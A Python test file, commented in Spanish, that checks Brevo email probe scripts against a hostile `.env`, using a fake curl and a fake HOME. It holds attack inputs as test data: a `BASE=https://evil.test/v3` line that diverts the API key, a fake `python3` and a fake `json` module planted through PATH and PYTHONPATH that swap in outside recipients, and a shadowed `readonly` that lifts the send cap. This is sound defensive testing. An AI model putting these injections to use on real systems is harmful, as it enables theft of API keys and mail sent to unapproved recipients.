#!/usr/bin/env python3
"""Los sondeos de Brevo frente a un `.env` hostil, y frente a un curl que no responde.

Las tres causas raíz que los revisores midieron el 2026-09-17 (commit 8aa8b62) tienen en
común que **el ataque no está en la red: está en el orden de las asignaciones**. Los
sondeos cargan `~/.config/tfm/.env` con `set -a` y un `source`, y esa pareja puede definir
*cualquier* nombre del shell. Todo lo que se asigne antes es sobrescribible: la ruta de la
guarda que comprueba los destinatarios, el host al que viaja la clave, el tope de la
pasada, el libro de cuentas y el testigo de parada.

## Cómo se prueba sin salir a internet, ni por error de programación

1. **El `.env` es un fichero temporal.** El real, `~/.config/tfm/.env`, no se lee ni se
   escribe: cada caso monta un `HOME` de mentira y los sondeos resuelven `~` contra él.
   Las claves de estos ficheros son literales inventados (`xkeysib-FALSA-...`).
2. **`curl` es de mentira y va primero en el `PATH`.** No abre ningún socket: registra la
   URL, el fichero de configuración que le llega por la entrada estándar —donde viaja la
   cabecera `api-key`—, el fichero del cuerpo y **cuántos destinatarios** lleva; después
   responde de un guión. Los sondeos invocan `curl` a secas, así que el del sistema no
   llega a ejecutarse.
3. **Los sondeos se copian a un árbol temporal.** `AQUI` sale de `dirname "$0"`, así que
   los JSON de evidencia caen en el temporal y el repositorio no se toca.

## Qué afirma cada caso

Cada test afirma la conducta **segura**. Sobre el código de hoy fallan, y el mensaje del
fallo enseña el ataque consumado — no un import roto ni un fichero que falta.

| Caso | Línea del `.env` | Lo que demuestra |
|---|---|---|
| `test_a_*` | `GUARDA=<guarda falsa>` | el sobre sale con una dirección ajena y la guarda real no corre |
| `test_b_*` | `BASE=<host falso>` | la cabecera `api-key` viaja a un host arbitrario |
| `test_c_*` | `TOPE_PASADA=99` | el tope de tres envíos de D-046 deja de existir |
| `test_d1_*` | `PARADA=<ruta inocua>` | el testigo de parada deja de valer y el sondeo arranca |
| `test_d2_*` | `LIBRO=<fichero vacío>` | el gasto ya anotado se vuelve invisible |
| `test_e_*` | (ninguna) | un `000` de curl no anota gasto y el bucle escala a 2.001 destinatarios |
| `test_f1_*` | (ninguna) | una petición de 2.000 destinatarios aceptada se anota como gasto 1 |
| `test_f2_*` | (ninguna) | la reserva previa de una petición de dos destinatarios es de 1 |
| `test_h_*`, `test_h2_*` | `readonly () {...}` / `readonly TOPE_PASADA=99` | un fichero que se *sourcea* desarma el `readonly` de dos maneras |
| `test_i_*`, `test_i2_*` | `[ () {...}` / `readonly -f reservar` | el tope y la PARADA dependían de una orden interna sombreable |
| `test_j_*` | `PATH=<dir>` | el `python3` de la guarda de la lista blanca salía de ahí |
| `test_k_*` | `PYTHONPATH=<dir>` | `import json` suplantable dentro de cada heredoc |
| `test_l_*` | `HOME=<otro>` | el libro y la PARADA se construyen con `$HOME` |
| `test_n_*` | (ninguna) | el libro en 444 no aborta y el tope deja de morder |
| `test_o_*` | (ninguna) | curl lee su `curlrc` aunque se le pase `--config` |
| `test_p_*`, `test_q_*` | (ninguna) | el brazo de sandbox, retirado, y el coste declarado una sola vez |
| `test_x_*`, `test_y_*` | (ninguna) | el coste de un sondeo de lectura salía de un `"metodo": "GET"` escrito a mano |
"""

import json
import os
import re
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path

HERR = Path(__file__).resolve().parents[1]          # 05_salida/_herramientas

LIBRERIAS = (
    "lib_env_brevo.sh",
    "lib_presupuesto_brevo.sh",
    "lib_curl_brevo.sh",
    "lib_guarda_preflight_brevo.sh",
    "lib_lista_blanca.py",
)

# El curl de mentira. Registra y responde; no abre ningun socket ni importa nada de red.
CURL_FALSO = r'''#!/usr/bin/env python3
import json, os, sys

LOG    = os.environ["FALSO_CURL_LOG"]
MODO   = os.environ.get("FALSO_CURL_MODO", "rechazo")
ACEPTA = os.environ.get("FALSO_CURL_ACEPTA", "")
# El metodo que curl dice haber usado (%{method}). POST aqui es una lectura que volvio como
# envio aceptado: el caso que el resumen de un sondeo de lectura tiene que ver.
METODO = os.environ.get("FALSO_CURL_METODO", "")

args = sys.argv[1:]
cfg, salida, cabf, fmt, url, metodo, datos = "", None, None, None, None, None, None
hs = []
i = 0
while i < len(args):
    a = args[i]
    if a == "--config":
        i += 1
        if i < len(args) and args[i] == "-":
            cfg = sys.stdin.read()
    elif a == "-o":
        i += 1; salida = args[i]
    elif a == "-D":
        i += 1; cabf = args[i]
    elif a == "-w":
        i += 1; fmt = args[i]
    elif a == "-H":
        i += 1; hs.append(args[i])
    elif a == "-X":
        i += 1; metodo = args[i]
    elif a == "--data-binary":
        i += 1; datos = args[i]
    elif a == "--max-time":
        i += 1
    elif a.startswith("http://") or a.startswith("https://"):
        url = a
    i += 1

fichero = datos[1:] if (datos or "").startswith("@") else (datos or "")
es_envio = bool(fichero)

def correos_de(p):
    """Las direcciones que el fichero de peticion lleva de verdad, leidas con el json real."""
    try:
        d = json.load(open(p))
    except Exception:
        return []
    fuera = []
    def rec(o):
        if not isinstance(o, dict):
            return
        for k in ("to", "cc", "bcc"):
            for e in (o.get(k) or []):
                if isinstance(e, dict) and e.get("email"):
                    fuera.append(e["email"])
        r = o.get("replyTo")
        if isinstance(r, dict) and r.get("email"):
            fuera.append(r["email"])
        for v in (o.get("messageVersions") or []):
            rec(v)
    rec(d)
    return fuera


def cuenta_dest(p):
    try:
        d = json.load(open(p))
    except Exception:
        return 0
    n = [0]
    def rec(o):
        if not isinstance(o, dict):
            return
        for k in ("to", "cc", "bcc"):
            v = o.get(k) or []
            if isinstance(v, list):
                n[0] += len(v)
        for v in (o.get("messageVersions") or []):
            rec(v)
    rec(d)
    return n[0]

reg = {"url": url, "metodo": METODO or metodo or ("POST" if es_envio else "GET"),
       "config": cfg, "cabeceras": hs, "modo": MODO, "argv": args,
       "datos": os.path.basename(fichero) if fichero else None,
       "destinatarios": cuenta_dest(fichero) if es_envio else 0,
       "correos": correos_de(fichero) if es_envio else []}

def escribe(p, t):
    if p:
        with open(p, "w") as f:
            f.write(t)

def anota():
    with open(LOG, "a") as f:
        f.write(json.dumps(reg) + "\n")

if MODO == "cero":
    # Lo que curl deja cuando el transporte se rompe: nada escrito y un codigo de salida
    # distinto de cero. Los sondeos lo traducen a code="000".
    reg["http"] = "000"
    anota(); escribe(salida, ""); escribe(cabf, "")
    sys.exit(28)

if METODO == "POST":
    code = "201"
    cuerpo = json.dumps({"messageId": "<falso@smtp-relay.invalido>"})
elif not es_envio:
    code = "200"
    cuerpo = json.dumps({"email": "titular@ejemplo.test",
                         "plan": [{"type": "free", "creditsType": "sendLimit",
                                   "credits": 300, "startDate": None,
                                   "endDate": None}]})
elif MODO == "acepta" and ACEPTA and ACEPTA in (reg["datos"] or ""):
    code = "201"
    cuerpo = json.dumps({"messageId": "<falso@smtp-relay.invalido>"})
else:
    code = "400"
    cuerpo = json.dumps({"code": "missing_parameter",
                         "message": "sender is missing (curl de mentira)"})

reg["http"] = code
anota()
escribe(salida, cuerpo)
escribe(cabf, "HTTP/2 %s\r\ndate: Thu, 17 Sep 2026 12:00:00 GMT\r\n"
               "content-type: application/json\r\nx-sib-ratelimit-limit: 1000\r\n"
               "x-sib-ratelimit-remaining: 999\r\nx-sib-ratelimit-reset: 1\r\n\r\n" % code)
if fmt:
    tam = str(os.path.getsize(fichero)) if (fichero and os.path.exists(fichero)) else "0"
    sys.stdout.write(fmt.replace("%{http_code}", code)
                        .replace("%{method}", reg["metodo"])
                        .replace("%{size_upload}", tam)
                        .replace("%{time_total}", "0.100")
                        .replace("\\t", "\t").replace("\\n", "\n"))
'''

GUARDA_FALSA = r'''#!/usr/bin/env python3
"""Guarda suplantada: acepta lo que le echen y devuelve direcciones AJENAS.

Imita el contrato de lib_lista_blanca.py -- rc 0 y la envolvente por stdout -- porque los
sondeos mandan la SALIDA de la guarda, no su entrada. Devuelve dos piezas para que el
`assert len(dest) == 2` del constructor del cuerpo se cumpla.
"""
import sys
print("victima@ajeno.example,otra-victima@ajeno.example")
sys.exit(0)
'''

PYTHON_FALSO = """#!/usr/bin/python3
\"\"\"python3 suplantado. Solo miente cuando le toca validar la lista blanca.

El shebang va con la ruta ABSOLUTA a proposito: con '/usr/bin/env python3' este mismo
fichero se volveria a encontrar por el PATH que el caso esta plantando y el ataque se
quedaria en un bucle de exec -- un cuelgue, no una fuga -- que no prueba lo que se quiere
probar. Lo que hay que ver es el sobre saliendo con direcciones ajenas.
\"\"\"
import os, sys

if any("lib_lista_blanca.py" in a for a in sys.argv[1:]):
    print("desconocido1@evil.test,desconocido2@evil.test")
    sys.exit(0)
os.execv("/usr/bin/python3", ["/usr/bin/python3"] + sys.argv[1:])
"""

JSON_FALSO = """\"\"\"json suplantado por PYTHONPATH: reescribe a quien se escribe.

Carga el json de VERDAD -- sacandose a si mismo de sys.modules y su directorio de sys.path,
que si no 'from json import scanner' vuelve aqui y el import sale circular -- y solo cambia
dos funciones: 'dump' escribe destinatarios ajenos y 'load' devuelve los de la lista blanca,
para que verificar_cuerpo() lea el fichero que le conviene y no el que se sube.
\"\"\"
import importlib as _il
import os as _os
import sys as _sys

_dir = _os.path.realpath(_os.path.dirname(_os.path.abspath(__file__)))
_mio = _sys.modules.pop("json", None)
_antes = list(_sys.path)
_sys.path[:] = [p for p in _sys.path
                if _os.path.realpath(p or _os.getcwd()) != _dir]
_real = _il.import_module("json")
_sys.path[:] = _antes
if _mio is not None:
    _sys.modules["json"] = _mio

AJENOS = ["desconocido1@evil.test", "desconocido2@evil.test"]
BLANCA = ["persona-3@example.invalid", "persona-1@example.invalid"]


def _cambia(o, a):
    if isinstance(o, dict):
        for k, v in list(o.items()):
            if k == "to" and isinstance(v, list) and v:
                o[k] = [{"email": x} for x in a[:len(v)]]
            else:
                _cambia(v, a)
    elif isinstance(o, list):
        for x in o:
            _cambia(x, a)
    return o


def dump(obj, fp, *a, **k):
    return _real.dump(_cambia(obj, AJENOS), fp, *a, **k)


def dumps(obj, *a, **k):
    return _real.dumps(obj, *a, **k)


def load(fp, *a, **k):
    return _cambia(_real.load(fp, *a, **k), BLANCA)


def loads(s, *a, **k):
    return _cambia(_real.loads(s, *a, **k), BLANCA)


JSONDecodeError = _real.JSONDecodeError
"""

CLAVE_FALSA = "xkeysib-FALSA-0000000000000000-AAAA"
ENV_BASE = (
    "BREVO_API_KEY=%s" % CLAVE_FALSA,
    "BREVO_API_KEY_2=xkeysib-FALSA-2222222222222222-BBBB",
    "BREVO_FROM=remitente@ejemplo.test",
)


class Banco:
    """Un HOME de mentira, un curl de mentira y una copia de los sondeos."""

    def __init__(self, raiz, lineas_env=(), modo="rechazo", acepta=""):
        self.raiz = Path(raiz)
        self.home = self.raiz / "home"
        self.repo = self.raiz / "repo"
        self.herr = self.repo / "05_salida" / "_herramientas"
        self.bin = self.raiz / "bin"
        self.tmp = self.raiz / "tmp"
        self.log = self.raiz / "curl.log"
        for d in (self.home, self.herr, self.bin, self.tmp):
            d.mkdir(parents=True, exist_ok=True)

        for nombre in LIBRERIAS:
            shutil.copy2(HERR / nombre, self.herr / nombre)
        for p in HERR.glob("probe_brevo_*.sh"):
            shutil.copy2(p, self.herr / p.name)

        falso = self.bin / "curl"
        falso.write_text(CURL_FALSO)
        falso.chmod(0o755)

        self.guarda_falsa = self.raiz / "guarda_falsa.py"
        self.guarda_falsa.write_text(GUARDA_FALSA)
        self.guarda_falsa.chmod(0o755)

        self.env = self.home / ".config" / "tfm" / ".env"
        self.env.parent.mkdir(parents=True, exist_ok=True)
        self.reescribe_env(*lineas_env)

        self.entorno = {
            "HOME": str(self.home),
            "PATH": "%s:%s" % (self.bin, os.environ.get("PATH", "/usr/bin:/bin")),
            "TMPDIR": str(self.tmp),
            "FALSO_CURL_LOG": str(self.log),
            "FALSO_CURL_MODO": modo,
            "FALSO_CURL_ACEPTA": acepta,
            "LANG": "C",
            "LC_ALL": "C",
        }

    # --- el .env simulado ---------------------------------------------------------
    def reescribe_env(self, *lineas):
        """El `.env` de mentira. Las lineas hostiles se pasan enteras, tal cual."""
        self.env.write_text("\n".join(list(ENV_BASE) + list(lineas)) + "\n")

    def señuelo(self, nombre):
        """Una ruta DENTRO del arbol temporal del caso, para que no se filtre a /tmp.

        La version anterior de este test apuntaba el señuelo de la PARADA a
        `/tmp/parada_que_no_existe.txt`. El ataque lo creaba, el fichero sobrevivia al
        caso y la segunda pasada del test abortaba con la PARADA del señuelo: un ataque
        consumado leido como conducta segura.
        """
        return self.raiz / nombre

    # --- plantar un interprete o un modulo de mentira ------------------------------
    def bin_falso(self, nombre, cuerpo):
        """Un directorio con un ejecutable dentro, para colgarselo a un PATH hostil."""
        d = self.raiz / ("bin_" + nombre)
        d.mkdir(exist_ok=True)
        f = d / nombre
        f.write_text(cuerpo)
        f.chmod(0o755)
        return d

    def modulo_falso(self, nombre, cuerpo):
        """Un directorio con un modulo de python dentro, para un PYTHONPATH hostil."""
        d = self.raiz / ("py_" + nombre)
        d.mkdir(exist_ok=True)
        (d / (nombre + ".py")).write_text(cuerpo)
        return d

    # --- lanzar un sondeo ---------------------------------------------------------
    def corre(self, sondeo, *args, extra=None, limite=600):
        env = dict(self.entorno)
        if extra:
            env.update(extra)
        return subprocess.run(["bash", str(self.herr / sondeo), *args],
                              env=env, capture_output=True, text=True, timeout=limite)

    # --- lo que el curl de mentira vio --------------------------------------------
    def llamadas(self):
        if not self.log.exists():
            return []
        return [json.loads(l) for l in self.log.read_text().splitlines() if l.strip()]

    # --- el libro de cuentas ------------------------------------------------------
    @property
    def libro_real(self):
        return self.home / ".local" / "state" / "tfm" / "presupuesto_brevo.tsv"

    @property
    def parada_real(self):
        return self.home / ".local" / "state" / "tfm" / "brevo_parada.txt"

    def movimientos(self, fichero=None):
        f = Path(fichero) if fichero else self.libro_real
        if not f.exists():
            return []
        movs = []
        for linea in f.read_text().splitlines():
            if linea.startswith("#") or not linea.strip():
                continue
            c = linea.split("\t")
            if len(c) < 4:
                continue
            # La columna de unidades es la 5.a cuando existe; sin ella, una linea vale 1.
            if len(c) >= 6 and c[4].isdigit():
                unidades, detalle = int(c[4]), c[5]
            else:
                unidades, detalle = 1, (c[4] if len(c) > 4 else "")
            movs.append({"utc": c[0], "movimiento": c[1], "script": c[2],
                         "tramo": c[3], "unidades": unidades, "detalle": detalle})
        return movs

    def comprometido(self):
        """Lo que el libro tiene comprometido, en las unidades que el propio libro usa."""
        total = 0
        for m in self.movimientos():
            if m["movimiento"] in ("RESERVA", "GASTO_DIRECTO"):
                total += m["unidades"]
            elif m["movimiento"] == "LIBERA":
                total -= m["unidades"]
        return total

    def siembra_libro(self, reservas=3, tope=3):
        self.libro_real.parent.mkdir(parents=True, exist_ok=True)
        lineas = ["# libro de cuentas de los envios de Brevo (D-046 condicion 2)",
                  "# tope de la pasada: %d envios. La pasada son las ultimas 24 horas."
                  % tope]
        hoy = subprocess.run(["date", "-u", "+%Y-%m-%dT%H:%M:%SZ"],
                             capture_output=True, text=True).stdout.strip()
        for n in range(reservas):
            lineas.append("%s\tRESERVA\tsiembra\ttramo_%d\t1\tsembrado por el test" % (hoy, n))
        self.libro_real.write_text("\n".join(lineas) + "\n")


def cifra(patron, texto):
    m = re.search(patron, texto)
    return int(m.group(1)) if m else None


def emails_de(fichero):
    d = json.loads(Path(fichero).read_text())
    fuera = []

    def rec(o):
        for k in ("to", "cc", "bcc"):
            for e in (o.get(k) or []):
                fuera.append((e or {}).get("email", ""))
        for v in (o.get("messageVersions") or []):
            rec(v)

    rec(d)
    return fuera


class BaseSondeo(unittest.TestCase):
    maxDiff = None

    def banco(self, **kw):
        d = tempfile.mkdtemp(prefix="brevo_entorno_")
        self.addCleanup(shutil.rmtree, d, True)
        return Banco(d, **kw)

    def assertNoSalioDelRepo(self):
        """Ni un JSON de evidencia nuevo dentro del repositorio de verdad."""
        self.assertEqual(
            [], sorted(p.name for p in HERR.glob("probe_brevo_*_2*.json")),
            "el test dejo ficheros de evidencia dentro del repositorio")


# =============================================================================
# CAUSA 1 - orden de asignacion frente al source del .env
# =============================================================================
class TestCausa1Entorno(BaseSondeo):

    def test_a_guarda_del_env_no_suplanta_el_sobre(self):
        """Una linea GUARDA= en el .env no puede decidir a quien se escribe."""
        b = self.banco()
        b.reescribe_env("GUARDA=%s" % b.guarda_falsa)
        r = b.corre("probe_brevo_b_unidad_cuota.sh", "plan")
        req = b.home / ".cache" / "tfm" / "probe_brevo_b_unidad_cuota" / "req_real.json"
        self.assertTrue(req.exists(),
                        "la fase 'plan' no construyo el cuerpo.\nrc=%s\n%s\n%s"
                        % (r.returncode, r.stdout, r.stderr))
        dest = emails_de(req)
        self.assertEqual(
            ["persona-3@example.invalid", "persona-1@example.invalid"], dest,
            "ATAQUE CONSUMADO (causa 1): una sola linea 'GUARDA=<ruta>' en el .env "
            "suplanta el validador y el sobre que el sondeo iba a enviar lleva %r. "
            "DEST1 y DEST2 siguen intactos como literales y el assert de longitud se "
            "cumple, porque el cuerpo se construye con la SALIDA de la guarda. "
            "verificar_cuerpo() usa la MISMA variable, asi que las dos capas caen "
            "juntas." % (dest,))
        self.assertEqual([], b.llamadas(), "la fase 'plan' declara cero llamadas")

    def test_b_base_del_env_no_desvia_la_clave(self):
        """Una linea BASE= en el .env no puede llevarse la cabecera api-key."""
        b = self.banco(lineas_env=["BASE=https://evil.test/v3"])
        r = b.corre("probe_brevo_b_unidad_cuota.sh", "antes", extra={"PAUSA": "2"})
        llamadas = b.llamadas()
        self.assertTrue(llamadas,
                        "la fase 'antes' no llamo a nada.\nrc=%s\n%s\n%s"
                        % (r.returncode, r.stdout, r.stderr))
        url = llamadas[0]["url"] or ""
        con_clave = CLAVE_FALSA in (llamadas[0]["config"] or "")
        self.assertTrue(
            url.startswith("https://api.brevo.com/v3"),
            "ATAQUE CONSUMADO (causa 1): con 'BASE=https://evil.test/v3' en el .env la "
            "peticion sale hacia %r%s. El host de la API se asigna ANTES del source, asi "
            "que el .env lo sobrescribe."
            % (url, ", llevando la cabecera api-key con la clave de Brevo"
                    if con_clave else ""))

    def test_c_tope_del_env_no_sustituye_el_de_D046(self):
        """Una linea TOPE_PASADA= en el .env no puede subir el tope de la pasada."""
        b = self.banco(lineas_env=["TOPE_PASADA=99"])
        r = b.corre("probe_brevo_b_unidad_cuota.sh", "plan")
        tope = cifra(r"tope de la pasada entera[^0-9]*([0-9]+)", r.stdout)
        self.assertEqual(
            3, tope,
            "ATAQUE CONSUMADO (causa 1): con 'TOPE_PASADA=99' en el .env el sondeo "
            "declara un tope de %s envios, y el de D-046 son 3. La constante vive en "
            "lib_presupuesto_brevo.sh, que se sourcea ANTES del .env.\nrc=%s\n%s"
            % (tope, r.returncode, r.stdout))

    def test_d1_parada_del_env_no_apaga_el_testigo(self):
        """Con la PARADA puesta, ningun sondeo arranca aunque el .env la redirija."""
        b = self.banco(modo="acepta", acepta="d00_control_to_1")
        señuelo = b.señuelo("parada_inocua.txt")
        b.reescribe_env("PARADA=%s" % señuelo)
        b.parada_real.parent.mkdir(parents=True, exist_ok=True)
        b.parada_real.write_text("2026-09-17T10:00:00Z\tsiembra\tun 2xx donde no debia\n")
        r = b.corre("probe_brevo_a_destinatarios.sh",
                    extra={"BREVO_GUARDA": "sender_sumidero",
                           "BREVO_GUARDA_SIN_PREFLIGHT": "1"})
        llamadas = b.llamadas()
        self.assertEqual(
            5, r.returncode,
            "ATAQUE CONSUMADO (causa 1): la PARADA del paquete esta puesta y, con una "
            "linea 'PARADA=<ruta inocua>' en el .env, el sondeo arranca igual "
            "(rc=%s) y llega a hacer %d peticion(es) de envio. parada_comprobar() lee la "
            "variable que el .env acaba de redirigir.\n%s\n%s"
            % (r.returncode, len(llamadas), r.stdout[-2000:], r.stderr[-2000:]))
        self.assertEqual([], llamadas,
                         "con la PARADA puesta no se hace ninguna llamada")
        self.assertFalse(señuelo.exists(),
                         "la PARADA se escribio en el señuelo del .env")

    def test_g_readonly_aguanta_un_source_posterior(self):
        """El `readonly` de la libreria aguanta un source que llegue DETRAS.

        Ojo con lo que este caso prueba y con lo que NO. `readonly` NO es la defensa contra
        el `.env`: un fichero que se sourcea puede sombrear la propia orden interna
        (`readonly () { return 0; }`) o declarar los nombres readonly el primero, y las dos
        cosas la desarman -- eso lo prueban `test_h` y `test_h2`, y la defensa de verdad es
        que el `.env` ya no se sourcea (`lib_env_brevo.sh`). Lo que el readonly sigue
        cubriendo es el caso barato: una carga posterior de un fichero que no viene a
        atacar, sino a reasignar por descuido. Es un cinturon, y por eso al final de la
        libreria se COMPRUEBA ademas el valor de las tres constantes.

        Como ningun sondeo carga hoy un segundo fichero, el caso se monta con un guion que
        imita el prologo de un sondeo y luego hace esa carga: lo que se prueba es la
        libreria, no el guion.
        """
        b = self.banco()
        hostil = b.señuelo("segundo.env")
        hostil.write_text("TOPE_PASADA=99\nLIBRO=%s\nPARADA=%s\nCARGO_EL_RESTO=si\n"
                          % (b.señuelo("libro_falso.tsv"), b.señuelo("parada_falsa.txt")))
        guion = b.herr / "harness_readonly.sh"
        guion.write_text(
            'set -u\n'
            '. "$(dirname "$0")/lib_env_brevo.sh"\n'
            '. "$(dirname "$0")/lib_presupuesto_brevo.sh"\n'
            'brevo_carga_env\n'
            'set -a; . "%s"; set +a\n'
            'printf "TOPE=%%s\\nLIBRO=%%s\\nPARADA=%%s\\nRESTO=%%s\\n" '
            '"$TOPE_PASADA" "$LIBRO" "$PARADA" "${CARGO_EL_RESTO:-no}"\n' % hostil)
        r = b.corre("harness_readonly.sh")
        visto = dict(l.split("=", 1) for l in r.stdout.splitlines() if "=" in l)
        self.assertEqual(
            "3", visto.get("TOPE"),
            "el readonly no sujeta TOPE_PASADA frente a un source posterior: %r\n%s"
            % (visto, r.stderr))
        self.assertTrue(
            str(visto.get("LIBRO", "")).endswith("/.local/state/tfm/presupuesto_brevo.tsv"),
            "el readonly no sujeta LIBRO frente a un source posterior: %r" % (visto,))
        self.assertTrue(
            str(visto.get("PARADA", "")).endswith("/.local/state/tfm/brevo_parada.txt"),
            "el readonly no sujeta PARADA frente a un source posterior: %r" % (visto,))
        # Y el fallo es ruidoso, no silencioso: bash lo dice por stderr.
        self.assertIn("TOPE_PASADA", r.stderr,
                      "la reasignacion tiene que fallar en voz alta, no en silencio")
        # Lo que no es una constante del libro sigue cargandose: la guarda no rompe el .env.
        self.assertEqual("si", visto.get("RESTO"),
                         "el readonly no puede impedir que el resto del fichero se cargue")

    def test_d2_libro_del_env_no_borra_el_gasto(self):
        """Una linea LIBRO= en el .env no puede volver invisible lo ya gastado."""
        b = self.banco()
        vacio = b.señuelo("libro_vacio.tsv")
        vacio.write_text("")
        b.reescribe_env("LIBRO=%s" % vacio)
        b.siembra_libro(reservas=3)
        r = b.corre("probe_brevo_b_unidad_cuota.sh", "plan")
        visto = cifra(r"ya comprometidos en la ventana[^0-9]*([0-9]+)", r.stdout)
        self.assertEqual(
            3, visto,
            "ATAQUE CONSUMADO (causa 1): el libro de verdad tiene 3 envios comprometidos "
            "HOY y, con una linea 'LIBRO=<fichero vacio>' en el .env, el sondeo ve %s. "
            "El tope de la pasada vuelve a estar entero.\nrc=%s\n%s"
            % (visto, r.returncode, r.stdout))


# =============================================================================
# CAUSA 2 - el 000 de curl contado como "no gasto", y los bucles sin puerta
# =============================================================================
class TestCausa2Ambiguo(BaseSondeo):

    def test_e_un_000_anota_dudoso_para_la_parada_y_no_escala(self):
        """Un 000 no demuestra rechazo: se anota, se para y no se escala.

        El sondeo elegido es el preflight porque su primer caso lleva UN destinatario y si
        cabe en el tope de la pasada: asi la primera llamada se hace de verdad y el 000
        ocurre. Sus casos de 2.001 y 100 destinatarios son la escalada que hay que ver
        cortada.
        """
        b = self.banco(modo="cero")
        r = b.corre("probe_brevo_a_preflight_rechazo.sh")
        llamadas = b.llamadas()
        self.assertTrue(llamadas,
                        "el sondeo no llego a hacer ninguna llamada, asi que el caso no "
                        "prueba nada.\nrc=%s\n%s\n%s"
                        % (r.returncode, r.stdout[-2000:], r.stderr[-2000:]))
        casos = [c.get("datos") or "" for c in llamadas]
        grandes = [c for c, n in ((c.get("datos"), c.get("destinatarios"))
                                  for c in llamadas) if (n or 0) > 3]
        movs = b.movimientos()
        dudosos = [m for m in movs if m["movimiento"] == "DUDOSO"]

        self.assertEqual(
            [], grandes,
            "ATAQUE CONSUMADO (causa 2): el primer caso devolvio 000 -- que NO demuestra "
            "rechazo -- y el bucle siguio escalando hasta %r. Se construyeron y mandaron "
            "casos de hasta %d destinatarios sin que ningun caso de control de 1 "
            "destinatario haya demostrado un 4xx explicito. Casos ejecutados: %r"
            % (grandes, max((c.get("destinatarios") or 0) for c in llamadas) if llamadas
               else 0, casos))
        self.assertTrue(
            dudosos,
            "ATAQUE CONSUMADO (causa 2): %d peticiones de envio devolvieron 000 y el "
            "libro no anoto NADA (%d movimientos). Un 000 significa que Brevo pudo "
            "aceptar la peticion y perderse la respuesta, asi que el lado conservador es "
            "contarlo como gastado."
            % (len(llamadas), len(movs)))
        self.assertTrue(
            b.parada_real.exists(),
            "ATAQUE CONSUMADO (causa 2): tras un resultado ambiguo en un endpoint de "
            "envio no se puso la PARADA, asi que el siguiente sondeo del paquete repite "
            "la jugada con su propia primera peticion.")
        self.assertNotEqual(
            0, r.returncode,
            "un resultado ambiguo en un endpoint de envio no puede terminar en exito")


# =============================================================================
# CAUSA 3 - la unidad de cuenta del libro
# =============================================================================
class TestCausa3Unidad(BaseSondeo):

    def test_f1_no_se_manda_un_caso_que_el_tope_no_cubre(self):
        """2.000 destinatarios no caben en un tope de 3: la peticion no se manda."""
        b = self.banco(modo="acepta", acepta="d03_to_2000")
        # BREVO_GUARDA sola ya no basta: desde el 2026-09-17 forzar la guarda a mano exige
        # decirlo dos veces, porque saltarse el preflight en silencio era la puerta por la
        # que un sondeo de carga podia subir 184 MB con una guarda que nadie valido.
        r = b.corre("probe_brevo_a_destinatarios.sh",
                    extra={"BREVO_GUARDA": "sender_sumidero",
                           "BREVO_GUARDA_SIN_PREFLIGHT": "1"})
        llamadas = b.llamadas()
        aceptadas = [c for c in llamadas if str(c.get("http", "")).startswith("2")]
        gasto = b.comprometido()
        mandados = [(c.get("datos"), c.get("destinatarios")) for c in llamadas]

        self.assertEqual(
            [], [c for c in llamadas if (c.get("destinatarios") or 0) > 3],
            "ATAQUE CONSUMADO (causa 3): el tope de la pasada son 3 envios y el sondeo "
            "mando peticiones de hasta %d destinatarios sin reservar nada. Lo mandado: "
            "%r.%s"
            % (max((c.get("destinatarios") or 0) for c in llamadas) if llamadas else 0,
               mandados,
               ("\n   La de %d destinatarios fue ACEPTADA y el libro solo tiene %d "
                "unidad(es) comprometida(s): 'un envio = una peticion aceptada' no vale "
                "aqui." % (aceptadas[0].get("destinatarios"), gasto)) if aceptadas
               else ""))
        self.assertEqual(
            [], aceptadas,
            "una peticion de envio aceptada rompe la invariante del paquete A")
        self.assertEqual(
            4, r.returncode,
            "cuando ningun par cabe en el tope, el sondeo aborta con exit 4 (tope) y lo "
            "dice.\nrc=%s\n%s\n%s"
            % (r.returncode, r.stdout[-2500:], r.stderr[-2500:]))
        self.assertEqual(
            [], llamadas,
            "y no hace NI UNA llamada: todos los pares de este sondeo se acotan con casos "
            "de 99 destinatarios o mas, y un caso de control suelto no demuestra nada "
            "(regla 6). Llamadas hechas: %r" % (mandados,))

    def test_f2_la_reserva_se_hace_por_destinatarios(self):
        """Una peticion de dos destinatarios reserva dos, no una.

        Se mide con la fase `enviar`, que es la unica que postea desde que el brazo de
        sandbox se retiro. Hace falta el instrumento -- `antes` y `reposo` en 2xx -- porque
        `enviar` aborta sin linea base.
        """
        b = self.banco(modo="acepta", acepta="req_real")
        for fase in ("antes", "reposo"):
            b.corre("probe_brevo_b_unidad_cuota.sh", fase, extra={"PAUSA": "2"})
        r = b.corre("probe_brevo_b_unidad_cuota.sh", "enviar", extra={"PAUSA": "2"})
        llamadas = [c for c in b.llamadas() if c["metodo"] == "POST"]
        self.assertTrue(llamadas,
                        "la fase 'enviar' no llego a postear.\nrc=%s\n%s\n%s"
                        % (r.returncode, r.stdout, r.stderr))
        n = llamadas[0].get("destinatarios")
        reservas = [m for m in b.movimientos() if m["movimiento"] == "RESERVA"]
        self.assertTrue(reservas, "la fase 'enviar' no reservo nada en el libro")
        self.assertEqual(
            n, reservas[0]["unidades"],
            "ATAQUE CONSUMADO (causa 3): la peticion llevaba %s destinatarios y el libro "
            "reservo %s unidad(es). La unidad de cuenta del libro es la peticion, no el "
            "destinatario, asi que el tope de D-046 no mide lo que se gasta."
            % (n, reservas[0]["unidades"]))
        self.assertEqual(
            n, b.comprometido(),
            "tras aceptar la peticion, lo comprometido en el libro tiene que ser %s "
            "unidades y es %s" % (n, b.comprometido()))


# =============================================================================
# LA RAIZ DE LA CAUSA 1: el .env se LEE, no se sourcea
#
# Los casos de arriba prueban una linea NOMBRE=VALOR. Los de aqui prueban que el fichero no
# puede EJECUTAR nada, que es lo que fallaba de verdad: mientras hubiese un `source`, el
# `.env` podia desarmar las dos defensas antes de que se ejecutaran -- sombreando
# `readonly`, declarando los nombres readonly el primero, sombreando `[` o `unset`, o
# cambiando `PATH` y `PYTHONPATH`, que los consume el interprete y no el shell.
# =============================================================================
class TestCausa1NoSeSourcea(BaseSondeo):

    def test_h_readonly_sombreado_no_borra_el_tope(self):
        """Con `readonly` convertido en funcion, el tope y la guarda siguen en pie.

        Comprobado en esta maquina: `readonly () { return 0; }; TOPE=99; readonly TOPE=3`
        deja `TOPE=99`, porque la busqueda de funciones va antes que la de ordenes internas.
        Con un source, esa linea desarmaba las dos defensas declaradas a la vez.
        """
        b = self.banco()
        b.reescribe_env("readonly () { return 0; }",
                        "TOPE_PASADA=99",
                        "GUARDA=%s" % b.guarda_falsa,
                        "BASE=https://evil.test/v3")
